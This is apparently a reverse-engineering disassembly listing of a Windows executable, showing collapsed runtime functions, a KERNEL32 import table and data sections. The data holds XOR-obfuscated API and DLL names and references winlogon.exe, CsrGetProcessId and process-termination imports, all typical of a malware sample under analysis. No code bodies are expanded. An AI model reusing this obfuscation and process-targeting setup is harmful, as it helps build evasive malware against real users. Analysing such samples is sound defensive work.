; [0000002F BYTES: COLLAPSED FUNCTION _free. PRESS KEYPAD "+" TO EXPAND]
; [00000012 BYTES: COLLAPSED FUNCTION _malloc. PRESS KEYPAD "+"	TO EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION __nh_malloc. PRESS KEYPAD	"+" TO EXPAND]
; [00000036 BYTES: COLLAPSED FUNCTION __heap_alloc. PRESS KEYPAD "+" TO	EXPAND]
; [00000199 BYTES: COLLAPSED FUNCTION __setmbcp. PRESS KEYPAD "+" TO EXPAND]
; [0000004A BYTES: COLLAPSED FUNCTION _getSystemCP. PRESS KEYPAD "+" TO	EXPAND]
; [00000033 BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS KEYPAD "+" TO EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION _setSBCS.	PRESS KEYPAD "+" TO EXPAND]
; [00000185 BYTES: COLLAPSED FUNCTION _setSBUpLow. PRESS KEYPAD	"+" TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS KEYPAD "+"	TO EXPAND]
; [0000003E BYTES: COLLAPSED FUNCTION ___sbh_heap_init.	PRESS KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION ___sbh_find_block. PRESS KEYPAD "+" TO EXPAND]
; [0000032B BYTES: COLLAPSED FUNCTION ___sbh_free_block. PRESS KEYPAD "+" TO EXPAND]
; [00000309 BYTES: COLLAPSED FUNCTION ___sbh_alloc_block. PRESS	KEYPAD "+" TO EXPAND]
; [000000B1 BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_region. PRESS KEYPAD "+"	TO EXPAND]
; [000000FB BYTES: COLLAPSED FUNCTION ___sbh_alloc_new_group. PRESS KEYPAD "+" TO EXPAND]
; [00000089 BYTES: COLLAPSED FUNCTION ___crtMessageBoxA. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [000000FE BYTES: COLLAPSED FUNCTION _strncpy.	PRESS KEYPAD "+" TO EXPAND]
; [0000001B BYTES: COLLAPSED FUNCTION __callnewh. PRESS	KEYPAD "+" TO EXPAND]
; [00000224 BYTES: COLLAPSED FUNCTION ___crtLCMapStringA. PRESS	KEYPAD "+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION _strncnt.	PRESS KEYPAD "+" TO EXPAND]
; [00000149 BYTES: COLLAPSED FUNCTION ___crtGetStringTypeA. PRESS KEYPAD "+" TO	EXPAND]
		align 10h
; [00000335 BYTES: COLLAPSED FUNCTION _memcpy_0. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION RtlUnwind. PRESS KEYPAD "+" TO EXPAND]
		align 1000h
_text		ends

; Section 2. (virtual address 00005000)
; Virtual size			: 00000886 (   2182.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 00005000
; Flags	40000040: Data Readable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; int __stdcall	lstrcmpA(LPCSTR	lpString1, LPCSTR lpString2)
		extrn lstrcmpA:dword	; CODE XREF: sub_40129B+33p
					; DATA XREF: sub_40129B+33r ...
; DWORD	__stdcall GetCurrentThreadId()
		extrn GetCurrentThreadId:dword ; CODE XREF: sub_40163D+AAp
					; DATA XREF: sub_40163D+AAr
; DWORD	__stdcall GetCurrentProcessId()
		extrn GetCurrentProcessId:dword	; CODE XREF: sub_40163D+A0p
					; sub_401711+12p
					; DATA XREF: ...
; BOOL __stdcall GetComputerNameA(LPSTR	lpBuffer, LPDWORD nSize)
		extrn GetComputerNameA:dword ; CODE XREF: sub_40163D+9Ap
					; DATA XREF: sub_40163D+9Ar
; UINT __stdcall WinExec(LPCSTR	lpCmdLine, UINT	uCmdShow)
		extrn WinExec:dword	; CODE XREF: sub_40163D+82p
					; DATA XREF: sub_40163D+82r
; BOOL __stdcall GetVolumeInformationA(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer,	DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR	lpFileSystemNameBuffer,	DWORD nFileSystemNameSize)
		extrn GetVolumeInformationA:dword ; CODE XREF: sub_40163D+5Fp
					; DATA XREF: sub_40163D+5Fr
; UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize)
		extrn GetSystemDirectoryA:dword	; CODE XREF: sub_40163D+31p
					; DATA XREF: sub_40163D+31r
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn GetProcAddress:dword ; CODE XREF:	sub_40163D+1Dp
					; sub_401759+17p ...
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; CODE XREF: sub_40163D+16p
					; DATA XREF: sub_40163D+16r
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; CODE XREF: .text:00401750p
					; _fast_error_exit+1Dp	...
; void __stdcall ExitThread(DWORD dwExitCode)
		extrn ExitThread:dword	; CODE XREF: sub_401711+38p
					; DATA XREF: sub_401711+38r
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; CODE XREF: sub_401711+31p
					; sub_4018E5+2Fp
					; DATA XREF: ...
; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT	uExitCode)
		extrn TerminateProcess:dword ; CODE XREF: sub_401711+2Ap
					; _doexit+17p
					; DATA XREF: ...
; HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
		extrn OpenProcess:dword	; CODE XREF: sub_401711+1Cp
					; DATA XREF: sub_401711+1Cr
; void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)
		extrn RaiseException:dword ; CODE XREF:	sub_401711+Cp
					; DATA XREF: sub_401711+Cr
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; CODE	XREF: sub_401759+Bp
					; ___crtMessageBoxA+12p
					; DATA XREF: ...
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
		extrn CreateThread:dword ; CODE	XREF: sub_40180A+Cp
					; DATA XREF: sub_40180A+Cr
		extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
; LPSTR	__stdcall GetCommandLineA()
		extrn GetCommandLineA:dword ; CODE XREF: start+74p
					; DATA XREF: start+74r
; DWORD	__stdcall GetVersion()
		extrn GetVersion:dword	; CODE XREF: start+26p
					; DATA XREF: start+26r
; HANDLE __stdcall GetCurrentProcess()
		extrn GetCurrentProcess:dword ;	CODE XREF: _doexit+10p
					; DATA XREF: _doexit+10r
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn UnhandledExceptionFilter:dword ; CODE XREF: __XcptFilter+138p
					; DATA XREF: __XcptFilter+138r
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPCH lpFilename, DWORD nSize)
		extrn GetModuleFileNameA:dword ; CODE XREF: __setargv+23p
					; __NMSG_WRITE+6Dp
					; DATA XREF: ...
; BOOL __stdcall FreeEnvironmentStringsA(LPCH)
		extrn FreeEnvironmentStringsA:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+11Fp
					; DATA XREF: ___crtGetEnvironmentStringsA+11Fr
; BOOL __stdcall FreeEnvironmentStringsW(LPWCH)
		extrn FreeEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+CEp
					; DATA XREF: ___crtGetEnvironmentStringsA+CEr
; int __stdcall	WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR	lpMultiByteStr,	int cbMultiByte, LPCSTR	lpDefaultChar, LPBOOL lpUsedDefaultChar)
		extrn WideCharToMultiByte:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+93p
					; ___crtGetEnvironmentStringsA+B5p ...
; LPCH __stdcall GetEnvironmentStrings()
		extrn GetEnvironmentStrings:dword
					; CODE XREF: ___crtGetEnvironmentStringsA:loc_4026FBp
					; ___crtGetEnvironmentStringsA+E1p
					; DATA XREF: ...
; LPWCH	__stdcall GetEnvironmentStringsW()
		extrn GetEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+1Bp
					; ___crtGetEnvironmentStringsA+5Bp
					; DATA XREF: ...
; UINT __stdcall SetHandleCount(UINT uNumber)
		extrn SetHandleCount:dword ; CODE XREF:	__ioinit+19Dp
					; DATA XREF: __ioinit+19Dr
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn GetStdHandle:dword ; CODE	XREF: __ioinit+158p
					; __NMSG_WRITE+143p
					; DATA XREF: ...
; DWORD	__stdcall GetFileType(HANDLE hFile)
		extrn GetFileType:dword	; CODE XREF: __ioinit+FFp
					; __ioinit+166p
					; DATA XREF: ...
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; CODE XREF: __ioinit+59p
					; DATA XREF: __ioinit+59r
; BOOL __stdcall HeapDestroy(HANDLE hHeap)
		extrn HeapDestroy:dword	; CODE XREF: __heap_init+2Fp
					; DATA XREF: __heap_init+2Fr
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
		extrn HeapCreate:dword	; CODE XREF: __heap_init+11p
					; DATA XREF: __heap_init+11r
; BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
		extrn VirtualFree:dword	; CODE XREF: ___sbh_free_block+257p
					; ___sbh_free_block+2B2p
					; DATA XREF: ...
; BOOL __stdcall HeapFree(HANDLE hHeap,	DWORD dwFlags, LPVOID lpMem)
		extrn HeapFree:dword	; CODE XREF: _free+27p
					; ___sbh_free_block+2C4p ...
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; CODE XREF: __NMSG_WRITE+14Ap
					; DATA XREF: __NMSG_WRITE+14Ar
; LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
		extrn HeapAlloc:dword	; CODE XREF: __heap_alloc+2Ep
					; ___sbh_heap_init+Dp ...
; BOOL __stdcall GetCPInfo(UINT	CodePage, LPCPINFO lpCPInfo)
		extrn GetCPInfo:dword	; CODE XREF: __setmbcp+48p
					; _setSBUpLow+14p
					; DATA XREF: ...
; UINT __stdcall GetACP()
		extrn GetACP:dword	; DATA XREF: _getSystemCP+2Fr
; UINT __stdcall GetOEMCP()
		extrn GetOEMCP:dword	; DATA XREF: _getSystemCP+1Ar
; LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
		extrn VirtualAlloc:dword ; CODE	XREF: ___sbh_alloc_new_region+76p
					; ___sbh_alloc_new_group+51p
					; DATA XREF: ...
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes)
		extrn HeapReAlloc:dword	; CODE XREF: ___sbh_alloc_new_region+28p
					; DATA XREF: ___sbh_alloc_new_region+28r
; int __stdcall	MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr,	int cchWideChar)
		extrn MultiByteToWideChar:dword	; CODE XREF: ___crtLCMapStringA+DFp
					; ___crtLCMapStringA+137p ...
; int __stdcall	LCMapStringA(LCID Locale, DWORD	dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest)
		extrn LCMapStringA:dword ; CODE	XREF: ___crtLCMapStringA+5Ep
					; ___crtLCMapStringA+A7p
					; DATA XREF: ...
; int __stdcall	LCMapStringW(LCID Locale, DWORD	dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int	cchDest)
		extrn LCMapStringW:dword ; CODE	XREF: ___crtLCMapStringA+42p
					; ___crtLCMapStringA+14Dp ...
; BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr,	int cchSrc, LPWORD lpCharType)
		extrn GetStringTypeA:dword ; CODE XREF:	___crtGetStringTypeA+59p
					; ___crtGetStringTypeA+8Dp
					; DATA XREF: ...
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWSTR lpSrcStr, int	cchSrc,	LPWORD lpCharType)
		extrn GetStringTypeW:dword ; CODE XREF:	___crtGetStringTypeA+3Fp
					; ___crtGetStringTypeA+12Dp
					; DATA XREF: ...


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 4050C4h
		align 8
dword_4050C8	dd 0FFFFFFFFh, 4017DFh,	4017E3h, 0 ; DATA XREF:	StartAddress+5o
dword_4050D8	dd 0FFFFFFFFh, 401922h,	401926h, 0 ; DATA XREF:	sub_4018E5+5o
dword_4050E8	dd 0FFFFFFFFh, 4020D8h,	4020ECh, 746E7572h, 20656D69h ;	DATA XREF: start+5o
		dd 6F727265h, 2072h, 0A0Dh, 534F4C54h, 72652053h, 0D726F72h
		dd 0Ah,	474E4953h, 72726520h, 0A0D726Fh, 0
aDomainError	db 'DOMAIN error',0Dh,0Ah,0
		align 4
aR6028UnableToI	db 'R6028',0Dh,0Ah
		db '- unable to initialize heap',0Dh,0Ah,0
		align 10h
aR6027NotEnough	db 'R6027',0Dh,0Ah
		db '- not enough space for lowio initialization',0Dh,0Ah,0
		align 4
aR6026NotEnough	db 'R6026',0Dh,0Ah
		db '- not enough space for stdio initialization',0Dh,0Ah,0
		align 10h
aR6025PureVirtu	db 'R6025',0Dh,0Ah
		db '- pure virtual function call',0Dh,0Ah,0
		align 4
aR6024NotEnough	db 'R6024',0Dh,0Ah
		db '- not enough space for _onexit/atexit table',0Dh,0Ah,0
		align 10h
aR6019UnableToO	db 'R6019',0Dh,0Ah
		db '- unable to open console device',0Dh,0Ah,0
		align 4
aR6018Unexpecte	db 'R6018',0Dh,0Ah
		db '- unexpected heap error',0Dh,0Ah,0
		align 10h
aR6017Unexpecte	db 'R6017',0Dh,0Ah
		db '- unexpected multithread lock error',0Dh,0Ah,0
		align 10h
aR6016NotEnough	db 'R6016',0Dh,0Ah
		db '- not enough space for thread data',0Dh,0Ah,0
aAbnormalProgra	db 0Dh,0Ah
		db 'abnormal program termination',0Dh,0Ah,0
		align 10h
aR6009NotEnough	db 'R6009',0Dh,0Ah
		db '- not enough space for environment',0Dh,0Ah,0
aR6008NotEnough	db 'R6008',0Dh,0Ah
		db '- not enough space for arguments',0Dh,0Ah,0
		align 4
aR6002FloatingP	db 'R6002',0Dh,0Ah      ; DATA XREF: .data:off_4062E4o
		db '- floating point not loaded',0Dh,0Ah,0
		align 10h
aMicrosoftVisua	db 'Microsoft Visual C++ Runtime Library',0 ; DATA XREF: __NMSG_WRITE+119o
		align 4
; char asc_4053A8[]
asc_4053A8	db 0Ah			; DATA XREF: __NMSG_WRITE+F1o
		db 0Ah,0
		align 4
; char aRuntimeErrorPr[]
aRuntimeErrorPr	db 'Runtime Error!',0Ah ; DATA XREF: __NMSG_WRITE+D3o
		db 0Ah
		db 'Program: ',0
		align 4
; char a___[]
a___		db '...',0              ; DATA XREF: __NMSG_WRITE+BFo
; char aProgramNameUnk[]
aProgramNameUnk	db '<program name unknown>',0 ; DATA XREF: __NMSG_WRITE+7Do
		align 4
; char aGetlastactivep[]
aGetlastactivep	db 'GetLastActivePopup',0 ; DATA XREF: ___crtMessageBoxA+3Do
		align 4
; char aGetactivewindo[]
aGetactivewindo	db 'GetActiveWindow',0  ; DATA XREF: ___crtMessageBoxA+35o
; char aMessageboxa[]
aMessageboxa	db 'MessageBoxA',0      ; DATA XREF: ___crtMessageBoxA+24o
; char aUser32_dll[]
aUser32_dll	db 'user32.dll',0       ; DATA XREF: ___crtMessageBoxA+Do
		align 10h
; char byte_405420[]
byte_405420	db 4 dup(0)		; DATA XREF: ___crtLCMapStringA+57o
					; ___crtGetStringTypeA+52o
; const	WCHAR SrcStr
SrcStr		dw 0			; DATA XREF: ___crtLCMapStringA+36o
					; ___crtGetStringTypeA+39o
		align 4
dword_405428	dd 0FFFFFFFFh, 403AF9h,	403AFDh, 0FFFFFFFFh, 403BADh, 403BB1h
					; DATA XREF: ___crtLCMapStringA+5o
dword_405440	dd 0FFFFFFFFh, 403D31h,	403D35h	; DATA XREF: ___crtGetStringTypeA+5o
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_405474 ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva lstrcmpA		; Import Address Table
		dd 5 dup(0)
;
; Import names for KERNEL32.dll
;
off_405474	dd rva word_405538	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_405544
		dd rva word_40555A
		dd rva word_405570
		dd rva word_405584
		dd rva word_40558E
		dd rva word_4055A6
		dd rva word_4055BC
		dd rva word_4055CE
		dd rva word_4055E2
		dd rva word_4055F0
		dd rva word_4055FE
		dd rva word_40560C
		dd rva word_405620
		dd rva word_40562E
		dd rva word_405640
		dd rva word_405650
		dd rva word_40566E
		dd rva word_40567A
		dd rva word_40568C
		dd rva word_40569A
		dd rva word_4056AE
		dd rva word_4056CA
		dd rva word_4056E0
		dd rva word_4056FA
		dd rva word_405714
		dd rva word_40572A
		dd rva word_405742
		dd rva word_40575C
		dd rva word_40576E
		dd rva word_40577E
		dd rva word_40578C
		dd rva word_40579E
		dd rva word_4057AC
		dd rva word_4057BA
		dd rva word_4057C8
		dd rva word_4057D4
		dd rva word_4057E0
		dd rva word_4057EC
		dd rva word_4057F8
		dd rva word_405802
		dd rva word_40580E
		dd rva word_40581E
		dd rva word_40582C
		dd rva word_405842
		dd rva word_405852
		dd rva word_405862
		dd rva word_405874
		dd 0
word_405538	dw 2FCh			; DATA XREF: .rdata:off_405474o
		db 'lstrcmpA',0
		align 4
word_405544	dw 0FAh			; DATA XREF: .rdata:00405478o
		db 'GetCurrentThreadId',0
		align 2
word_40555A	dw 0F8h			; DATA XREF: .rdata:0040547Co
		db 'GetCurrentProcessId',0
word_405570	dw 0CEh			; DATA XREF: .rdata:00405480o
		db 'GetComputerNameA',0
		align 4
word_405584	dw 2D3h			; DATA XREF: .rdata:00405484o
		db 'WinExec',0
word_40558E	dw 177h			; DATA XREF: .rdata:00405488o
		db 'GetVolumeInformationA',0
word_4055A6	dw 159h			; DATA XREF: .rdata:0040548Co
		db 'GetSystemDirectoryA',0
word_4055BC	dw 13Eh			; DATA XREF: .rdata:00405490o
		db 'GetProcAddress',0
		align 2
word_4055CE	dw 126h			; DATA XREF: .rdata:00405494o
		db 'GetModuleHandleA',0
		align 2
word_4055E2	dw 7Dh			; DATA XREF: .rdata:00405498o
		db 'ExitProcess',0
word_4055F0	dw 7Eh			; DATA XREF: .rdata:0040549Co
		db 'ExitThread',0
		align 2
word_4055FE	dw 1Bh			; DATA XREF: .rdata:004054A0o
		db 'CloseHandle',0
word_40560C	dw 29Eh			; DATA XREF: .rdata:004054A4o
		db 'TerminateProcess',0
		align 10h
word_405620	dw 1EFh			; DATA XREF: .rdata:004054A8o
		db 'OpenProcess',0
word_40562E	dw 20Bh			; DATA XREF: .rdata:004054ACo
		db 'RaiseException',0
		align 10h
word_405640	dw 1C2h			; DATA XREF: .rdata:004054B0o
		db 'LoadLibraryA',0
		align 10h
word_405650	dw 4Ah			; DATA XREF: .rdata:004054B4o
		db 'CreateThread',0
		align 10h
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .rdata:00405458o
		align 2
word_40566E	dw 22Fh			; DATA XREF: .rdata:004054B8o
		db 'RtlUnwind',0
word_40567A	dw 0CAh			; DATA XREF: .rdata:004054BCo
		db 'GetCommandLineA',0
word_40568C	dw 174h			; DATA XREF: .rdata:004054C0o
		db 'GetVersion',0
		align 2
word_40569A	dw 0F7h			; DATA XREF: .rdata:004054C4o
		db 'GetCurrentProcess',0
word_4056AE	dw 2ADh			; DATA XREF: .rdata:004054C8o
		db 'UnhandledExceptionFilter',0
		align 2
word_4056CA	dw 124h			; DATA XREF: .rdata:004054CCo
		db 'GetModuleFileNameA',0
		align 10h
word_4056E0	dw 0B2h			; DATA XREF: .rdata:004054D0o
		db 'FreeEnvironmentStringsA',0
word_4056FA	dw 0B3h			; DATA XREF: .rdata:004054D4o
		db 'FreeEnvironmentStringsW',0
word_405714	dw 2D2h			; DATA XREF: .rdata:004054D8o
		db 'WideCharToMultiByte',0
word_40572A	dw 106h			; DATA XREF: .rdata:004054DCo
		db 'GetEnvironmentStrings',0
word_405742	dw 108h			; DATA XREF: .rdata:004054E0o
		db 'GetEnvironmentStringsW',0
		align 4
word_40575C	dw 26Dh			; DATA XREF: .rdata:004054E4o
		db 'SetHandleCount',0
		align 2
word_40576E	dw 152h			; DATA XREF: .rdata:004054E8o
		db 'GetStdHandle',0
		align 2
word_40577E	dw 115h			; DATA XREF: .rdata:004054ECo
		db 'GetFileType',0
word_40578C	dw 150h			; DATA XREF: .rdata:004054F0o
		db 'GetStartupInfoA',0
word_40579E	dw 19Dh			; DATA XREF: .rdata:004054F4o
		db 'HeapDestroy',0
word_4057AC	dw 19Bh			; DATA XREF: .rdata:004054F8o
		db 'HeapCreate',0
		align 2
word_4057BA	dw 2BFh			; DATA XREF: .rdata:004054FCo
		db 'VirtualFree',0
word_4057C8	dw 19Fh			; DATA XREF: .rdata:00405500o
		db 'HeapFree',0
		align 4
word_4057D4	dw 2DFh			; DATA XREF: .rdata:00405504o
		db 'WriteFile',0
word_4057E0	dw 199h			; DATA XREF: .rdata:00405508o
		db 'HeapAlloc',0
word_4057EC	dw 0BFh			; DATA XREF: .rdata:0040550Co
		db 'GetCPInfo',0
word_4057F8	dw 0B9h			; DATA XREF: .rdata:00405510o
		db 'GetACP',0
		align 2
word_405802	dw 131h			; DATA XREF: .rdata:00405514o
		db 'GetOEMCP',0
		align 2
word_40580E	dw 2BBh			; DATA XREF: .rdata:00405518o
		db 'VirtualAlloc',0
		align 2
word_40581E	dw 1A2h			; DATA XREF: .rdata:0040551Co
		db 'HeapReAlloc',0
word_40582C	dw 1E4h			; DATA XREF: .rdata:00405520o
		db 'MultiByteToWideChar',0
word_405842	dw 1BFh			; DATA XREF: .rdata:00405524o
		db 'LCMapStringA',0
		align 2
word_405852	dw 1C0h			; DATA XREF: .rdata:00405528o
		db 'LCMapStringW',0
		align 2
word_405862	dw 153h			; DATA XREF: .rdata:0040552Co
		db 'GetStringTypeA',0
		align 4
word_405874	dw 156h			; DATA XREF: .rdata:00405530o
		db 'GetStringTypeW',0
		align 800h
_rdata		ends

; Section 3. (virtual address 00006000)
; Virtual size			: 00000A1C (   2588.)
; Section size in file		: 00001000 (   4096.)
; Offset to raw	data for section: 00006000
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 406000h
dword_406000	dd 0			; DATA XREF: __cinit+1Fo
dword_406004	dd 0			; DATA XREF: __cinit+1Ao
dword_406008	dd 0			; DATA XREF: __cinit+10o
		dd offset ___initmbctable
dword_406010	dd 0			; DATA XREF: __cinit:loc_40214Bo
dword_406014	dd 0			; DATA XREF: _doexit+65o
dword_406018	dd 0			; DATA XREF: _doexit:loc_4021EFo
dword_40601C	dd 0			; DATA XREF: _doexit+76o
dword_406020	dd 4 dup(0)		; DATA XREF: _doexit:loc_402200o
dword_406030	dd 1C4Fh		; DATA XREF: sub_401021+9r
					; sub_401021:loc_4010B6r ...
dword_406034	dd 6F6F7846h, 65796F58h, 6F69787Fh, 0 ;	DATA XREF: sub_40118B+FDo
dword_406044	dd 6169654Ch, 65796F58h, 6F69787Fh, 0 ;	DATA XREF: sub_40118B+ECo
dword_406054	dd 6E6B654Ch, 65796F58h, 6F69787Fh, 0 ;	DATA XREF: sub_40118B+DBo
dword_406064	dd 6F706353h, 6F586C65h, 787F6579h, 6F69h ; DATA XREF: sub_40118B+CAo
dword_406074	dd 6E646346h, 65796F58h, 6F69787Fh, 4Bh	; DATA XREF: sub_40118B+B9o
dword_406084	dd 7F796F52h, 625E6F67h, 6E6B6F78h, 0 ;	DATA XREF: sub_40118B+A8o
aSoBxokniedOr	db 'So~^bxoknIed~or~',0 ; DATA XREF: sub_40118B+97o
		align 4
aGoBxokniedOr	db 'Go~^bxoknIed~or~',0 ; DATA XREF: sub_40118B+86o
		align 4
aWxcOzxeioyygog	db 'Wxc~oZxeioyyGogexs',0 ; DATA XREF: sub_40118B+75o
		align 10h
dword_4060D0	dd 7E786356h, 4B666B7Fh, 69656666h, 724Fh ; DATA XREF: sub_40118B+64o
aNwvmnbsujftlep	db 'NwVmnbsUjftLePf`wjlm',0 ; DATA XREF: sub_40118B+53o
		align 4
aCxokOzxeioyyk	db 'Cxok~oZxeioyyK',0   ; DATA XREF: sub_40118B+42o
		align 4
dword_406108	dd 477E6F47h, 667F6E65h, 646B426Fh, 4B6F666Eh, 0 ; DATA	XREF: sub_40118B+31o
dword_40611C	dd 477E6F47h, 667F6E65h, 66634C6Fh, 676B446Fh, 4B6Fh
					; DATA XREF: sub_40118B+20o
aGoZxeiknnxoyy	db 'Go~ZxeiKnnxoyy',0   ; DATA XREF: sub_40118B+Fo
		align 10h
; char aKoxdof98Nff[]
aKoxdof98Nff	db 'koxdof98$nff',0     ; DATA XREF: sub_40118Bo
		align 10h
; char aNNffNff[]
aNNffNff	db 'n~nff$nff',0        ; DATA XREF: sub_401314+B5o
		align 4
aExe		db 'EXE',0              ; DATA XREF: sub_401482+2o
; char Source[]
Source		db '\winlogon.exe',0    ; DATA XREF: sub_40163D+6Do
		align 10h
; char LibFileName[]
LibFileName	db 'ntdll.dll',0        ; DATA XREF: sub_40163D+11o
					; sub_401759+6o
		align 4
; char ProcName[]
ProcName	db 'CsrGetProcessId',0  ; DATA XREF: sub_40163D+Co
; char aNtqueryinforma[]
aNtqueryinforma	db 'NtQueryInformationProcess',0 ; DATA XREF: sub_401759+11o
		align 4
a9n4m506m04707y	db '9N4M506M04707Y8080G80g08g80G80G0jmM87Ynm8h07Tn76GJ0h07hj90m870yj8'
					; DATA XREF: _main+65o	_main+7Ao
		db '07k7Y087yT186gf65F54D6d5D532S321qaxs57c68C868H9N6976ggh5',0
		align 10h
dword_406230	dd 19930520h, 4020ECh, 12F000h,	12FFC0h	; DATA XREF: .text:00401F17o
					; __NLG_Notify+2o
off_406240	dd offset __exit	; DATA XREF: __amsg_exit+1Cr
dword_406244	dd 1			; DATA XREF: __FF_MSGBANNER+Er
					; __NMSG_WRITE+46r
dword_406248	dd 0C0000005h		; DATA XREF: _xcptlookup+Ar
					; _xcptlookup+11o
		dd 0Bh,	0
		dd 0C000001Dh, 4, 0
		dd 0C0000096h, 4, 0
		dd 0C000008Dh, 8, 0
		dd 0C000008Eh, 8, 0
		dd 0C000008Fh, 8, 0
		dd 0C0000090h, 8, 0
		dd 0C0000091h, 8, 0
		dd 0C0000092h, 8, 0
		dd 0C0000093h, 8, 0
dword_4062C0	dd 3			; DATA XREF: __XcptFilter+58r
dword_4062C4	dd 7			; DATA XREF: __XcptFilter+5Er
dword_4062C8	dd 0Ah			; DATA XREF: _xcptlookup+4r
dword_4062CC	dd 8Ch			; DATA XREF: __XcptFilter+82r
					; __XcptFilter+8Fw ...
		dd 0FFFFFFFFh, 0A00h, 10h, 0
dword_4062E0	dd 2			; DATA XREF: __NMSG_WRITE+Eo
					; __NMSG_WRITE+28r
off_4062E4	dd offset aR6002FloatingP ; DATA XREF: __NMSG_WRITE+FCr
					; __NMSG_WRITE+12Do
					; "R6002\r\n- floating point not loaded\r\n"
		dd 8, 40532Ch, 9, 405300h, 0Ah,	4052DCh, 10h, 4052B0h
		dd 11h,	405280h, 12h, 40525Ch, 13h, 405230h, 18h, 4051F8h
		dd 19h,	4051D0h, 1Ah, 405198h, 1Bh, 405160h, 1Ch, 405138h
		dd 78h,	405128h, 79h, 405118h, 7Ah, 405108h, 0FCh, 405104h
		dd 0FFh, 4050F4h
byte_406370	db 1			; DATA XREF: __NMSG_WRITE+1Bo
					; __setmbcp+E1r
		db 2, 4, 8
		align 8
dword_406378	dd 3A4h			; DATA XREF: __setmbcp+2Fo
aVyv		db '`y!',0            ; DATA XREF: __setmbcp+11Do
		align 8
aJ		db '',0               ; DATA XREF: __setmbcp+C0o
		align 10h
aBe		db '',0
		align 8
		dd 0FCE09F81h, 0
		dd 0FC807E40h, 0
		dd 3A8h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE40h, 0
		dd 3B5h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE41h, 0
		dd 3B6h, 0A2E4A2CFh, 0A2E5001Ah, 5BA2E8h, 4 dup(0)
		dd 0FE81h, 0
		dd 0FEA17E40h, 0
		dd 551h, 0DA5EDA51h, 0DA5F0020h, 32DA6Ah, 4 dup(0)
